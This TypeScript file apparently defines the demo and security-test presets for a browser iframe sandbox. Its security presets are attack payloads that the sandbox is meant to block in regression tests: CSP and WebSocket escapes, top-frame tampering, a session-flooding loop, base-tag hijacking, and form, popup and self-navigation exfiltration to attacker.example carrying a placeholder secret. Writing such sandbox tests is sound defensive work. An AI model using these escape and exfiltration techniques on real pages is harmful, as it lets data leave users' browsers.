/**
 * Presets: the scenarios the playground offers for manual testing, and the payloads and rules the
 * regression specs run (backlog T4). One definition serves both, so an attack is written down once.
 *
 * Specs reach a preset only through `fromPreset(id)` (test/e2e/presets.ts). A coverage test
 * (test/unit/presets.test.ts) scans the spec files for those calls and fails when a preset in the
 * 'security' category has no spec, when a research reproduction runs no preset, or when a preset names a
 * research folder whose reproduction does not run it.
 */

import type { SafeCapability } from "../csp-directives";
import type { SandboxConfigOptions } from "../host";
import type { StrictSandboxOrigins } from "./csp/origins";

/**
 * A preset's rules. Each names the mode it was written for, so an attack keeps testing that mode whatever the default
 * is. A spec may still run a preset in another mode (`{ ...preset.rules, mode }`), so its origins are ones every mode
 * can take: no `scripts`, which strict mode does not take.
 */
export type PresetRules = SandboxConfigOptions & { mode: 'strict' | 'cooperative' | 'worker'; origins?: StrictSandboxOrigins };

export interface Preset {
    id: string;
    label: string;
    // 'security': an attack the sandbox must stop; every one has a regression spec. 'demo': a feature tour.
    category: 'security' | 'demo';
    // How `code` runs: as a script through execute() (needs scriptUnsafe) or as guest markup through load().
    run: 'script' | 'markup';
    code: string;
    rules: PresetRules;
    // Registered on the sandbox before it is built (registerFiles); the guest reads them through sandboxFiles.
    files?: Record<string, string>;
    // A URL in `code` (and every variant) that stands for the attacker: specs aim it at a listener outside the
    // browser (test/e2e/recorder.ts). The playground keeps it as written.
    target?: string;
    // More payloads for the same attack, run by the spec next to `code`; the playground shows `code`.
    variants?: Record<string, string>;
    // The research finding this preset reproduces: the folder under docs/research/ whose reproduce.spec.ts runs it.
    research?: string;
}

const LOGO_SVG = '<svg xmlns="http://www.w3.org/2000/svg" width="120" height="40" viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#4338ca"/><text x="60" y="26" font-family="sans-serif" font-size="16" fill="#fff" text-anchor="middle">logo.svg</text></svg>';

export const PRESETS = {
    "strict-demo": {
        id: "strict-demo",
        label: "Strict Mode (the default): a counter",
        category: "demo",
        run: "markup",
        // Strict mode, the default (ADR-005): main.js, the entry, runs in a worker and draws into the view through
        // sandboxView; the view runs no guest script. `code` is the initial view ("Run as HTML" loads it, and the entry
        // draws over it). The playground opens on this preset.
        code: `<main><p>Loading…</p></main>`,
        files: {
            "main.js": `let count = 0;
const draw = () => sandboxView.render(
  '<main><h1>Strict mode</h1>' +
  '<p>This code runs in a worker; the view shows what it renders and runs no guest script.</p>' +
  '<button id="add">Clicked ' + count + ' times</button></main>');
sandboxView.on('click', 'add', () => { count++; draw(); console.log('clicked', count); });
draw();
console.log('strict demo: the entry ran in the worker');`,
        },
        rules: { mode: "strict", entry: "main.js", watchdogTimeout: 2000 },
    },
    "basic": {
        id: "basic",
        label: "Basic Interaction",
        category: "demo",
        run: "script",
        code: `console.log("Hello from the Sandbox!");
fetch("https://jsonplaceholder.typicode.com/todos/1")
  .then(r => r.json())
  .then(j => console.log("Fetched:", j));`,
        rules: {
            mode: "cooperative",
            origins: { connect: ["https://jsonplaceholder.typicode.com"] },
            scriptUnsafe: true,
            capabilities: ["allow-scripts"],
        },
    },
    "csp-bypass": {
        id: "csp-bypass",
        label: "Security Test: CSP Bypass",
        category: "security",
        run: "script",
        research: "01_csp_bypass",
        target: "https://example.com/",
        // A nested frame declares a permissive policy of its own. It must still inherit the sandbox's
        // policy (policies only ever add up), so its fetch has to fail. The nested frame raises the
        // violation in its own document, where the sandbox's reporting does not reach, so it relays it.
        code: `addEventListener('message', (e) => console.log(e.data));

const iframe = document.createElement('iframe');
iframe.srcdoc = \`<meta http-equiv="Content-Security-Policy" content="default-src *; script-src 'unsafe-inline'">
<script>
  addEventListener('securitypolicyviolation', (e) => parent.postMessage('NESTED_VIOLATION ' + e.effectiveDirective + ' ' + e.blockedURI, '*'));
  fetch('https://example.com/', { mode: 'no-cors' })
    .then(() => parent.postMessage('PWN_SUCCESS', '*'))
    .catch(() => parent.postMessage('PWN_FAILURE', '*'));
<\\/script>\`;
document.body.appendChild(iframe);

setTimeout(() => console.log('TEST_DONE'), 1500);`,
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
    },
    "sw-tamper": {
        id: "sw-tamper",
        label: "Security Test: SW Tampering",
        category: "security",
        run: "script",
        research: "02_sw_tampering",
        // Having the API object is not access: Firefox exposes navigator.serviceWorker in a sandboxed
        // frame but rejects every call, Chromium throws on reading it. Only a working call counts.
        code: `(async () => {
    try {
        const registrations = await navigator.serviceWorker.getRegistrations();
        console.log('PWN_SUCCESS: can see ' + registrations.length + ' service worker registrations');
    } catch (e) {
        console.log('PWN_FAILURE: ' + e.name);
    }
    console.log('TEST_DONE');
})();`,
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
    },
    "worker-timeout": {
        id: "worker-timeout",
        label: "Worker Timeout Test",
        category: "demo",
        run: "script",
        code: `console.log("Starting infinite loop...");
while(true) {}`,
        rules: { mode: "worker", workerExecutionTimeout: 1000, scriptUnsafe: true }
    },
    "virtual-files-test": {
        id: "virtual-files-test",
        label: "Virtual Files System Test",
        category: "demo",
        run: "script",
        // The preset's files are registered on the sandbox; the guest reaches them through sandboxFiles,
        // as blob: URLs created in its own realm (README "Files", ADR-004).
        code: `console.log("Registered files:", sandboxFiles.list().join(", "));
sandboxFiles.text("main.js").then(t => console.log("Read main.js:", t));

const script = document.createElement("script");
script.src = sandboxFiles.url("main.js");
document.head.appendChild(script);

fetch(sandboxFiles.url("data.json"))
  .then(r => r.json())
  .then(j => console.log("Fetched data.json:", JSON.stringify(j)));

const img = new Image();
img.onload = () => console.log("logo.svg loaded:", img.naturalWidth + "x" + img.naturalHeight);
img.onerror = () => console.error("logo.svg failed to load");
img.src = sandboxFiles.url("logo.svg");
document.body.appendChild(img);

try { sandboxFiles.url("../main.js"); } catch (e) { console.log("../main.js:", e.code); }`,
        files: {
            "main.js": 'console.log("main.js ran from a guest-realm blob: URL");',
            "data.json": '{ "hello": "from data.json" }',
            "logo.svg": LOGO_SVG,
        },
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
    },
    "websocket-bypass": {
        id: "websocket-bypass",
        label: "Security Test: WebSocket Bypass",
        category: "security",
        run: "script",
        research: "04_websocket_bypass",
        target: "wss://echo.websocket.events",
        code: `try {
    const ws = new WebSocket('wss://echo.websocket.events');
    ws.onopen = () => console.log('PWN_SUCCESS');
    ws.onerror = () => console.log('PWN_FAILURE');
} catch(e) {
    console.log('PWN_FAILURE');
}
setTimeout(() => console.log('TEST_DONE'), 1000);`,
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
    },
    "outer-frame-tampering": {
        id: "outer-frame-tampering",
        label: "Security Test: Outer Frame Tampering",
        category: "security",
        run: "script",
        research: "05_outer_frame_tampering",
        code: `for (const [name, get] of [['parent', () => window.parent.document], ['top', () => window.top.document]]) {
    try {
        get();
        console.log('PWN_SUCCESS ' + name);
    } catch (e) {
        console.log('PWN_FAILURE ' + name + ' ' + e.name);
    }
}
setTimeout(() => console.log('TEST_DONE'), 100);`,
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
    },
    "monkey-patch-bypass": {
        id: "monkey-patch-bypass",
        label: "Security Test: Monkey Patch Bypass",
        category: "security",
        run: "script",
        research: "09_monkey_patch_bypass",
        target: "http://example.com",
        code: `fetch('http://example.com')
    .then(() => console.log('PWN_SUCCESS'))
    .catch(() => console.log('PWN_FAILURE'));
setTimeout(() => console.log('TEST_DONE'), 1000);`,
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
    },
    "protocol-handler": {
        id: "protocol-handler",
        label: "Security Test: Protocol Handler",
        category: "security",
        run: "script",
        research: "06_protocol_handlers",
        code: `try {
    navigator.registerProtocolHandler('web+test', 'https://example.com?q=%s', 'Test Handler');
    console.log('PWN_SUCCESS: Handler Registered');
} catch (e) {
    console.log('PWN_FAILURE: ' + e.message);
}
console.log('TEST_DONE');`,
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
    },
    "data-uri": {
        id: "data-uri",
        label: "Security Test: Data URI Navigation",
        category: "security",
        run: "script",
        research: "07_data_uri_navigation",
        code: `try {
    const dataUrl = 'data:text/html,<h1>PWNED</h1>';
    window.top.location.href = dataUrl;
} catch (e) {
    console.log('PWN_FAILURE: ' + e.message);
}
console.log('TEST_DONE');`,
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
    },
    "session-exhaustion": {
        id: "session-exhaustion",
        label: "Security Test: Session Exhaustion",
        category: "security",
        run: "script",
        research: "08_session_exhaustion",
        target: "/api/session",
        code: `(async () => {
    const start = Date.now();
    let count = 0;
    try {
        while (Date.now() - start < 5000) {
            await fetch('/api/session', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ allow: 'google.com' })
            });
            count++;
        }
        console.log('PWN_INFO: Created ' + count + ' sessions');
    } catch (e) {
        console.log('ERROR: ' + e.message);
    }
    console.log('TEST_DONE');
})();`,
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
    },
    "base-tag": {
        id: "base-tag",
        label: "Security Test: Base Tag Hijacking",
        category: "security",
        run: "script",
        research: "10_base_tag_hijacking",
        target: "https://google.com",
        code: `try {
    const base = document.createElement('base');
    base.href = 'https://google.com';
    document.head.appendChild(base);

    fetch('foo', { mode: 'no-cors' })
        .then(() => console.log('PWN_SUCCESS'))
        .catch(e => console.log('PWN_FAILURE: ' + e.message));

} catch (e) {
    console.log('PWN_FAILURE: ' + e.message);
}
setTimeout(() => console.log('TEST_DONE'), 2000);`,
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
    },
    "storage-sharing": {
        id: "storage-sharing",
        label: "Security Test: Storage Sharing",
        category: "security",
        run: "script",
        research: "03_storage_sharing",
        // Reads before it writes: run it, start a fresh sandbox (or reload the page) and run it again. The
        // second read must never return the first run's secret.
        code: `try {
    console.log('Read: ' + localStorage.getItem('SECRET'));
} catch (e) {
    console.log('Read Failed: ' + e.name);
}
try {
    localStorage.setItem('SECRET', '123');
    console.log('Write Done');
} catch (e) {
    console.log('Write Failed: ' + e.name);
}
console.log('TEST_DONE');`,
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts"] }
    },
    "alert-test": {
        id: "alert-test",
        label: "Security Test: Block Alert/Dialog",
        category: "security",
        run: "script",
        // Without allow-modals the browser ignores alert(): it returns at once and shows nothing, so only the
        // host can tell whether a dialog appeared (the spec watches for one).
        code: `alert("If you see this, alert() is not blocked");
console.log('ALERT_RETURNED');
console.log('TEST_DONE');`,
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts",] }
    },
    "allow-same-origin": {
        id: "allow-same-origin",
        label: "Security Test: allow-same-origin Filter",
        category: "security",
        run: "script",
        code: `if (window.origin !== 'null') {
    console.log('PWN_SUCCESS: allow-same-origin was NOT filtered!');
} else {
    console.log('PASS: Origin is opaque. Filter working.');
}
console.log('TEST_DONE');`,
        rules: { mode: "cooperative", capabilities: ["allow-scripts", "allow-same-origin" as SafeCapability], scriptUnsafe: true }
    },
    "allow-top-nav": {
        id: "allow-top-nav",
        label: "Security Test: allow-top-navigation Filter",
        category: "security",
        run: "script",
        code: `try {
    window.top.location.href = 'about:blank';
    console.log('PWN_SUCCESS: Top navigation allowed!');
} catch (e) {
    console.log('PASS: Top navigation blocked (' + e.message + ')');
}
console.log('TEST_DONE');`,
        rules: { mode: "cooperative", capabilities: ["allow-scripts", "allow-top-navigation" as SafeCapability], scriptUnsafe: true }
    },
    "allow-popups-escape": {
        id: "allow-popups-escape",
        label: "Security Test: allow-popups-to-escape-sandbox Filter",
        category: "security",
        run: "script",
        target: "https://example.com/",
        // A sandboxed popup keeps the sandbox, so the page it loads has an opaque origin ('null'); one that
        // escaped would run with that page's own origin.
        code: `(async () => {
    console.log("Note: 'allow-popups' is permitted, but 'allow-popups-to-escape-sandbox' is filtered.");
    console.log("This test requires you to allow popups for this site in your browser settings.");
    const win = window.open('https://example.com/', '_blank');
    if (win) {
        console.log("PWN_INFO: Popup opened (as expected via allow-popups).");
        console.log("If the filter worked, this new window is STILL sandboxed: the page in it has an opaque origin.");
    } else {
        console.log("PWN_FAILURE: Popup was blocked by the browser's popup blocker. Please allow popups and run again.");
    }
    console.log('TEST_DONE');
})();`,
        rules: { mode: "cooperative", capabilities: ["allow-scripts", "allow-popups-to-escape-sandbox" as SafeCapability], unsafeCapabilities: ["allow-popups"], scriptUnsafe: true }
    },
    "local-html-page": {
        id: "local-html-page",
        label: "Local HTML Page Test",
        category: "demo",
        run: "markup",
        code: `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <style>
        body { font-family: sans-serif; padding: 20px; background: #f4f4f9; }
        .test-section { margin-bottom: 20px; padding: 15px; background: white; border-radius: 8px; border: 1px solid #ddd; }
        .success { color: green; font-weight: bold; }
        img { display: block; margin-top: 10px; max-width: 200px; border: 1px solid #eee; }
    </style>
</head>
<body>
    <h2>Sandbox Feature Suite</h2>

    <div class="test-section">
        <h3>1. Script Execution</h3>
        <div id="status">❌ Script failed</div>
    </div>

    <div class="test-section">
        <h3>2. External Image</h3>
        <img src="https://picsum.dev/400/300" alt="External">
    </div>

    <div class="test-section" id="dynamic-section">
        <h3>3. Internal Image (a registered file)</h3>
        <!-- names the registered file by path: the host resolves it to the guest's own blob: URL -->
        <img src="logo.svg" alt="Internal Logo">
        <button onclick="loadInternal()">Load it again from script</button>
        <div id="img-target"></div>
    </div>

    <div class="test-section">
        <h3>4. Click Counter</h3>
        <button id="counter-btn">Clicked 0 times</button>
    </div>

        <div class="test-section">
            <h3>5. Style Injection</h3>
            <button id="style-btn">Change Theme</button>
            <div id="style-status">Status: Original</div>
        </div>

    <script>
        // Test 1
        document.getElementById('status').innerHTML = "✅ Script executed successfully.";
        document.getElementById('status').className = "success";

        // Test 3
        function loadInternal() {
            const target = document.getElementById('img-target');
            const img = document.createElement('img');
            // From script, a registered file is reached through sandboxFiles (its guest-realm blob: URL)
            img.src = sandboxFiles.url("logo.svg");
            img.alt = "Internal Logo";
            target.innerHTML = '';
            target.appendChild(img);
            console.log("Attempted to load internal image via JS function");
        }

        // Test 4
        let count = 0;
        const counterBtn = document.getElementById('counter-btn');
        counterBtn.addEventListener('click', () => {
            count++;
            counterBtn.textContent = "Clicked " + count + " times";
        });

        // Test 5: Dynamic Style Injection
        const styleBtn = document.getElementById('style-btn');
        const styleStatus = document.getElementById('style-status');
        styleBtn.addEventListener('click', () => {
            try {
                document.body.style.backgroundColor = '#eef2ff';
                const style = document.createElement('style');
                style.textContent = '#style-status { color: #4338ca; font-weight: bold; }';
                document.head.appendChild(style);
                styleStatus.textContent = "✅ Styles applied dynamically";
            } catch (e) {
                styleStatus.textContent = "❌ Style blocked: " + e.message;
            }
        });
    </script>
</body>
</html>`,
        rules: {
            mode: "cooperative",
            origins: { images: ["https://picsum.dev"] },
            // scriptUnsafe: true,
            capabilities: ["allow-scripts"],
        },
        files: { "logo.svg": LOGO_SVG },
    },
    "csp-swallow": {
        id: "csp-swallow",
        label: "Security Test: Markup That Swallows the CSP",
        category: "security",
        run: "markup",
        research: "11_meta_csp_delivery",
        // Guest markup that would hide or displace the injected policy if it were spliced into the markup
        // (an implicitly closed <head>, a comment, raw text). The policy must stay the first element of <head>.
        code: `<html><head><img src=x><!--</head><body></body></html>`,
        variants: {
            "comment around head": `<html><body><!-- <head> --></body></html>`,
            "comment before html": `<!-- <html><head> --><html><head></head><body></body></html>`,
            "full document": `<!DOCTYPE html><html lang="en"><head><title>t</title></head><body><p>full document</p></body></html>`,
            "textarea": `<textarea><head></textarea>`,
            "plaintext": `<plaintext>`,
        },
        // markup runs with allow-scripts; nothing here evaluates strings, so no scriptUnsafe (broad review I2)
        rules: { mode: "cooperative", capabilities: ["allow-scripts"] }
    },
    "form-action-exfil": {
        id: "form-action-exfil",
        label: "Security Test: Form Submission Exfiltration",
        category: "security",
        run: "markup",
        research: "12_non_fallback_directives",
        target: "https://attacker.example/exfil",
        // form-action has no default-src fallback: the default policy must still refuse the submission.
        code: `<form id="f" action="https://attacker.example/exfil" method="GET">
  <input name="stolen" value="session-secret">
</form>
<script>document.getElementById('f').submit();</script>`,
        rules: { mode: "cooperative", capabilities: ["allow-scripts", "allow-forms"] }
    },
    "popup-exfiltration": {
        id: "popup-exfiltration",
        label: "Security Test: Popup Exfiltration",
        category: "security",
        run: "script",
        research: "13_popup_exfiltration",
        target: "https://attacker.example",
        // A popup is a new top-level window that no CSP governs: its URL carries data out. allow-popups passed
        // as a regular capability is dropped (with a warning); only unsafeCapabilities enables it.
        code: `let outcome;
try {
    outcome = window.open('https://attacker.example/?leak=guest-secret') ? 'opened' : 'refused';
} catch (e) {
    outcome = 'refused'; // Firefox throws where popups are not allowed; the others return null
}
console.log('POPUP ' + outcome);`,
        rules: { mode: "cooperative", scriptUnsafe: true, capabilities: ["allow-scripts", "allow-popups" as SafeCapability] }
    },
    "self-navigation": {
        id: "self-navigation",
        label: "Security Test: Self-Navigation Exfiltration",
        category: "security",
        run: "markup",
        research: "14_self_navigation",
        target: "https://attacker.example",
        // No CSP directive governs where a document navigates itself; the wrapper frame's frame-src 'none' does.
        code: `<script>setTimeout(() => { location.href = 'https://attacker.example/?d=guest-secret'; }, 50)</script>`,
        variants: {
            "window.open _self": `<script>setTimeout(() => { window.open('https://attacker.example/?d=guest-secret', '_self'); }, 50)</script>`,
            "link click": `<a id="a" href="https://attacker.example/?d=guest-secret">x</a><script>setTimeout(() => document.getElementById('a').click(), 50)</script>`,
            "meta refresh": `<meta http-equiv="refresh" content="0;url=https://attacker.example/?d=guest-secret">`,
        },
        rules: { mode: "cooperative", capabilities: ["allow-scripts"] }
    },
} satisfies Record<string, Preset>;

export type PresetId = keyof typeof PRESETS;

/** The preset the playground opens on: strict mode, the default. */
export const DEFAULT_PRESET: PresetId = "strict-demo";
